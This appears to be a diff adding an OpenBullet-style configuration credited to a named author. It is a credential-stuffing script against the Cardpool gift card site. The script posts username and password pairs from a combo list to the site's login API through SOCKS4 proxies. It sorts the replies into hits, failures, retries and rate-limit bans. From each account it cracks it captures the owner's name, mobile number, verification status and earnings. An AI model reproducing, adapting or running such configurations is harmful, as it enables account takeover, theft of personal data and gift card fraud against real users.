@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Cardpool",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-08T19:19:22.8913472+02:00",
+  "AdditionalInfo": "US SOCKS4 PROXIES ONLY - Capture: Verified (True/False), First Name, Last Name, Mobile Number, Device Verified, Bulk Seller (True/False), Bulk Buyer (True/False), Saved To Date, Earned To Date",
+  "Author": "AlexTheDane#6884",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.cardpool.com/api/auth/login" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "{\"emailAddress\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"errorCode\":\"cardpool.web.authorization.error.login.user\",\"errorMessage\":\"Unrecognized combination\"}" 
+  KEYCHAIN Retry OR 
+    KEY "{\"errorCode\":\"cardpool.web.internal.error\",\"errorMessage\":\"Sorry, we were unable to process your request. Please try again.\"}" 
+  KEYCHAIN Ban OR 
+    KEY "429 Too Many Requests" 
+
+PARSE "<SOURCE>" LR "lVerified\":" ",\"f" -> CAP "Verified" 
+
+PARSE "<SOURCE>" LR "rstName\":\"" "\",\"l" -> CAP "First Name" 
+
+PARSE "<SOURCE>" LR "astName\":\"" "\",\"m" -> CAP "Last Name" 
+
+PARSE "<SOURCE>" LR "r\":" ",\"d" -> CAP "Mobile Number" 
+
+PARSE "<SOURCE>" LR ",\"deviceVerified\":" ",\"isBulkSeller" -> CAP "Device Verified" 
+
+PARSE "<SOURCE>" LR "\"isBulkSeller\":" ",\"isBulkBuyer" -> CAP "Bulk Seller" 
+
+PARSE "<SOURCE>" LR ",\"isBulkBuyer\":" "}" -> CAP "Bulk Buyer" 
+
+REQUEST GET "https://www.cardpool.com/account/overview" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" REGEX "\">Saved</span>\\n                    </div>\\n                    <div class=\"savings-and-earnings-to-date-section\">\\n                        <span class=\"savings-and-earnings-to-date-number number\">([^\"]*)</span>\\n                        <p class=\"savings-and-earnings-to-date-footer\">\\n                            <a href=\"/buy-gift-cards\">Browse cards and keep saving</a>" "[1]" -> CAP "Saved To Date" 
+
+PARSE "<SOURCE>" REGEX "\">Earned</span>\\n                    </div>\\n                    <div class=\"savings-and-earnings-to-date-section\">\\n                        <span class=\"savings-and-earnings-to-date-number number\">([^\"]*)</span>\\n                        <p class=\"savings-and-earnings-to-date-footer\">\\n                            <a href=\"/sell-gift-cards\">Sell your cards to earn more</a>" "[1]" -> CAP "Earned To Date" 
+
